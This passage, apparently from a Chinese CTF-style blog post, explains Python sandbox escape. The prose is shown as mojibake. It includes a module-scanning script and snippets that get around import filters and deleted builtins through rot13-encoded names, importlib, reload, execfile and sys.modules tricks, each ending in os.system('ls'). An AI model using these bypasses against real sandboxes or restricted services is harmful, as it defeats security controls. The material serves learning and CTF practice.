ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ï¼›åœ¨éä¸»æ¨¡å—ä¸­ <code>__builtins__</code> ä»…æ˜¯å¯¹ <code>__builtin__</code> . <code>__dict__</code> çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code> æœ¬èº«ã€‚å®ƒåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯è§ã€‚æ­¤æ—¶ <code>__builtins__</code> çš„ç±»å‹æ˜¯å­—å…¸ã€‚</li>\n</ol>\n<p>æˆ‘ä»¬æ‰“å¼€ IDLE çœ‹çœ‹è¿™é‡Œé¢éƒ½æœ‰ä»€ä¹ˆä¸œè¥¿å§(Python 2.7)ã€‚</p>\n<pre><code>&gt;&gt;&gt; dir(__builtins__)\n[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>æˆ‘ä»¬çœ‹åˆ°äº†å¸¸ç”¨çš„ <code>__import__</code> ã€ <code>bin</code> ã€ <code>eval</code> ç­‰å‘½ä»¤</p>\n<p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»å¤§è‡´ä¸ŠçŸ¥é“äº†å„ä¸ªæ¨¡å—ä¹‹é—´çš„å…³ç³»äº†ï¼</p>\n<h2 id=\"Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\"><a href=\"#Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\" class=\"headerlink\" title=\"Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\"></a>Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ</h2><p>os  commands  subprocess  timeit  platform  pty â€¦</p>\n<p>æ¬è¿ä¸€ä¸ªæµ‹è¯•æ‰€æœ‰å¯¼å…¥ os æˆ–è€… sys çš„åº“çš„è„šæœ¬ï¼š</p>\n<pre><code>#-*- coding:utf8 -*-\n# By Macr0phag3\n# in 2019-05-07 19:46:12\n# ------------------------------------\n\n# this, antigravity åº“åˆ æ‰\nall_modules_2 = [\n    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;\n]\n\nall_modules_3 = [\n    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;\n]\n\nmethods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]\n\nresults = {}\nfor module in all_modules_3:\n    results[module] = {\n        &apos;flag&apos;: 0,\n        &apos;result&apos;: {}\n    }\n\n    try:\n        m = __import__(module)\n        attrs = dir(m)\n        for method in methods:\n            if method in attrs:\n                result = &apos;yes&apos;\n                results[module][&apos;flag&apos;] = 1\n            else:\n                result = &apos;no&apos;\n\n            results[module][&apos;result&apos;][method] = result\n\n    except Exception as e:\n        print(e)\n\nfor result in results:\n    if results[result][&apos;flag&apos;]:\n        print(&apos;[+]&apos; + result)\n        for r in results[result][&apos;result&apos;]:\n            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>ä»ç»“æœå¯ä»¥çœ‹åˆ°æœ‰ç›¸å½“å¤§ä¸€éƒ¨åˆ†æ¨¡å—éƒ½å¯¼å…¥äº†â€œå±é™©â€çš„å‡½æ•°ã€‚åªè¦æˆ‘ä»¬å¯ä»¥ <code>import</code> é‚£ä¹ˆå­˜åœ¨è¿™äº›æ¨¡å—çš„ç¯å¢ƒå°±æ˜¯å±é™©çš„ã€‚</p>\n<h3 id=\"å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ\"><a href=\"#å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ\" class=\"headerlink\" title=\"å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ\"></a>å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ</h3><p>å¦‚æœåªæ˜¯ç®€å•çš„ç¦ç”¨ <code>import os</code> æˆ‘ä»¬å¯ä»¥åŠ ç©ºæ ¼ç»•è¿‡ <code>import   os</code> .</p>\n<p>å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&#39;os&#39;)</code>.</p>\n<p>å¦‚æœè¿‡æ»¤ os æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>ã€‚</p>\n<p>å¦‚æœè¿™ä¹Ÿä¸è¡Œè¿˜æœ‰ <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>\n<p>è”æƒ³åˆ°æˆ‘ä»¬ä¸Šé¢è¯´çš„ <code>__builtin__/__builtins__</code>,ä¸€äº›å±é™©å†…å»ºå‡½æ•°éƒ½å¯ä»¥ç›´æ¥ç”¨ï¼Œå¦‚æœè¿™äº›å‡½æ•°éƒ½è¢« del æ‰æˆ‘ä»¬å¯ä»¥ <code>reload(__builtin__)</code> æ¥é‡è½½ä¸€ä¸ªå®Œæ•´çš„ <code>__builtin__</code>.</p>\n<p>reload ä¹Ÿæ˜¯å†…å»ºå‡½æ•°ï¼Œå¦‚æœè¿™ä¹Ÿæ²¡äº†å‘¢ï¼Ÿ </p>\n<pre><code>import imp\nimp.reload(__builtin__)</code></pre><p>ä¹Ÿå¯ä»¥å¼•å…¥ã€‚</p>\n<p>å¦‚æœ <code>sys.modules[&#39;os&#39;]=None</code> ä»æ ¹æºåˆ é™¤å‘¢ï¼Ÿ</p>\n<p>å®é™…ä¸Šè”ç³»åˆ° import çš„åŸç†</p>\n<blockquote>\n<p>å¦‚æœæ˜¯ import Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ A<br>å¦‚æœæ˜¯ from A import Bï¼Œå…ˆä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå†è§£æAï¼Œä»ä¸­å¯»æ‰¾Bå¹¶å¡«å……åˆ° A çš„ dict ä¸­</p>\n</blockquote>\n<p>å¦‚æœ <code>sys</code> å¯ä»¥ç”¨çš„è¯å¯ä»¥å…ˆç¡®è®¤ä¸€ä¸‹è·¯å¾„</p>\n<pre><code>import sys\nprint(sys.path)</code></pre><p>æœ¬è´¨ä¸Šæ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç”¨ <code>execfile</code> æ¥ä»£æ›¿</p>\n<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)\nsystem(&apos;ls&apos;)</code></pre><p>3.x ä¸­åˆ é™¤äº† execfile ï¼Œä¸è¿‡å¯ä»¥è¿™æ ·ï¼š</p>\n<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:\n    exec(f.read())\nsystem(&apos;ls&apos;)</code></pre><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šå½“æˆ‘ä»¬ä½¿ç”¨ del sys.modules[â€˜osâ€™] æ—¶æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› ä¸ºåœ¨import æ—¶ä¼šåœ¨æ£€æµ‹åˆ°ä¸å­˜åœ¨ os æ—¶é‡è½½ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥</p>\n<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj ä¸ºä½ åŠ çš„\n\ndel sys.modules[&apos;os&apos;]\nimport os\nos.system(&apos;ls&apos;)</code></pre><h3 id=\"å…¶ä»–ä¸€äº›å°æŠ€å·§\"><a href=\"#å…¶ä»–ä¸€äº›å°æŠ€å·§\" class=\"headerlink\" 